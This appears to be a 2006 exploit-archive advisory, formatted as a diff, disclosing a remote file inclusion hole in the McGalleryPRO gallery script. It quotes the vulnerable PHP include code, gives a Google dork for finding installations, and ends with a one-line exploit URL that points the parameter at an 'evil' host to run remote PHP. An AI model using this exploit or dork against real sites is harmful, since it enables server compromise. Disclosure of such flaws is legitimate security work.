@@ -1,0 +1,50 @@
+#############################SolpotCrew Community################################
+#
+#        Mcgallerypro (path_to_folder) Remote File Inclusion
+#
+#        Download file : http://phpforums.net/mcgp/mcgp.zip/mcgp.zip
+#
+#################################################################################
+#
+#
+#       Bug Found By :Solpot a.k.a (k. Hasibuan) (10-09-2006)
+#
+#       contact: chris_hasibuan@yahoo.com
+#
+#       Website : http://www.nyubicrew.org/adv/solpot-adv-06.txt
+#
+################################################################################
+#
+#
+#      Greetz: choi , h4ntu , Ibnusina , r4dja , No-profile , begu , madkid
+#              robby , Matdhule , setiawan , m3lky , NpR , Fungky , barbarosa
+#              home_edition2001 , Rendy , cow_1seng , ^^KaBRuTz , bYu , Lappet-homo
+#              Blue|spy , cah|gemblung , Slacky , blind_boy , camagenta , XdikaX
+#              x-ace , Dalmet , #nyubi , #hitamputih @dalnet
+#              and all member solpotcrew community @ http://www.nyubicrew.org/forum/
+#
+#
+###############################################################################
+Input passed to the "path_to_folder" is not properly verified
+before being used to include files. This can be exploited to execute
+arbitrary PHP code by including files from local or external resources.
+
+code from random2.php
+
+if (!empty($_SERVER)) { extract($_SERVER, EXTR_OVERWRITE); }
+if (!empty($_GET)) { extract($_GET, EXTR_OVERWRITE); }
+if (!empty($_POST)) { extract($_POST, EXTR_OVERWRITE); }
+if (!empty($_COOKIE)) { extract($_COOKIE, EXTR_OVERWRITE); }
+if (!empty($_SESSION)) { extract($_SESSION, EXTR_OVERWRITE); }
+
+include ("$path_to_folder/admin/common.php");
+include ("$path_to_folder/lang/$lang_def");
+
+Google Dork; "powered by mcGalleryPRO"
+
+exploit : http://somehost/path_to_mcgallerypro/random2.php?path_to_folder=http://evil
+
+##############################MY LOVE JUST FOR U RIE#########################
+######################################E.O.F##################################
+
+# milw0rm.com [2006-09-10]
